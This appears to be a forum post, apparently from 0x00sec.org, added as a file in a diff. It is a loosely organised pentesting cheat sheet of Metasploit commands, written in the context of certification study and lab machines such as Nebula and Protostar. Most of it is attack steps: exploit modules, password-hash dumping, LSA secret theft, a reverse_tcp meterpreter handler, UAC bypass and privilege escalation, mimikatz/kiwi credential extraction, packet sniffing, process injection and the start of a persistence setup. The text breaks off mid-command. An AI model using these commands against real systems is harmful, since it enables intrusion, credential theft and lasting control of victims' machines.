@@ -1,0 +1,110 @@
+Author: Rebcesp from 0x00sec.org
+Hello:grinning:, good to everyone I leave some of the commands and tips I have collected throughout my studies and pentesting certifications, everything can be useful.The post is probably not very organized, I’m sorry for that but it can serve you many things for your pentesting.
+
+If you would like to learn hacking and pentesting I recommend some machines that are very complete and serve to practice many different techniques are: Nebula and Protostar
+
+Nebula: https://www.vulnhub.com/entry/exploit-exercises-nebula-v5,31/ 72
+
+Nebula: It takes a look at + SUID files + Permissions + Race conditions + Shell meta-variables + $PATH weaknesses + Scripting language weaknesses + Binary compilation failures At the end of Nebula, the user will have a reasonably thorough understanding of local attacks against Linux systems, and a cursory look at some of the remote attacks that are possible.
+
+Protostar: https://old.liveoverflow.com/binary_hacking/protostar/index.html 14
+
+Dradis-Framework(Create Reporte One-Click): https://dradisframework.com/ce/ 15
+
+Some of the modules of metasploit
+
+exploit/multi/samba/usermap_script
+auxiliary/scanner/mysql/mysql_login
+auxiliary/scanner/mysql/mysql_hashdump
+auxiliary/admin/mysql/mysql_sql
+auxiliary/scanner/postgres/postgres_login
+auxiliary/scanner/postgres/postgres_hashdump
+exploit/linux/postgres/postgres_payload
+auxiliary/scanner/http/tomcat_mgr_login
+exploit/multi/http/tomcat_mgr_deploy
+
+help -meterpreters
+background - Then interact with a session
+sessions s-i 2 (Identifier)
+meterpreter > load -l
+meterpreter > load sniffer
+migrate PID -> to migrate the process through the PID
+
+Post explotation
+basically means the phases of operation once a victim’s system has been compromised by the attacker.
+If we already have a compromised machine and we want to see all the modules of post exploitation, only with type post / windows + enter we can see the modules that metasploit offers us
+
+This module attempts to upgrade a command shell to meterpreter. The shell platform is automatically detected and the best version of meterpreter for the target is selected. Currently, meterpreter/reverse_tcp is used on Windows and Linux, with python/meterpreter/reverse_tcp’ used on all others.
+
+post/multi/manage/shell_to_meterpreter
+
+post/windows/gather/enum_logged_on_users(view logged users)
+post/windows/gather/checkvm (check if it is a virtual machine)
+post/windows/gather/forensics/browser_history
+post/windows/gather/lsa_secrets
+post/windows/gather/win_privs (scale privileges)
+
+If we need a reverse shell from metasploit we can use multi handler, for example, suppose we already have the machine compromised but we do not have a reverse shell, we follow these steps
+
+use exploit/multi/handler
+set payload windows/meterpreter/reverse_tcp
+set LHOST 192.168.99.243(ip example)
+set LPORT 4444
+exploit -j (sending PID to Background)
+jobs(we will be what are the processes that are running in the background)
+jobs -h(help)
+
+server in python(2.7)
+
+python -m SimpleHTTPServer 8000
+
+server in python(3.x)
+
+python -m http.server 8000
+
+Local Exploit
+Some of the methodologies when we have gained access to a machine and we have a user with low privileges and of course we want to get root. Suppose we have an exploit to launch and we escalate privileges
+
+use exploit/windows/local/ms15_051_client_copy_image
+
+we have got privileges and be NT / AUTHORITY-SYSTEM
+
+We can see all user hashes by typing hashdump.
+
+meterpreter>hashdump
+
+also if we have a local exploit and we launch it for example a bypass of uac, it is probably exploitable in windows7 without patching
+
+use exploit/windows/local/bypassuac
+load -l (the list of services we can upload)
+set session 5 (connect to session number 5)
+getsystem(we can test if we get root automatically)
+load_sniffer(we load a sniffer)
+sniffer_start 1
+sniffer_dump 1
+
+you could investigate more about sniffer its other options that it has
+Do not forget that while you load more services in the process the meterpreter’s memory grows, a good option is to migrate to another process also in case of losing the session for example:
+
+migrate PID
+
+You can also use this module of metasploit to inject the meterpreter in all the processes that can be:
+
+use post/windows/manage/multi_meterpreter_inject
+
+If we want to dump the victim’s ram
+
+load_winpem()
+
+mimikatz
+
+load_mimikatz
+wdigest
+load_kiwi
+
+Persistence
+
+use post/Windows/manage/persistence_exe
+set Session x
+info
+set REXEPATH C:
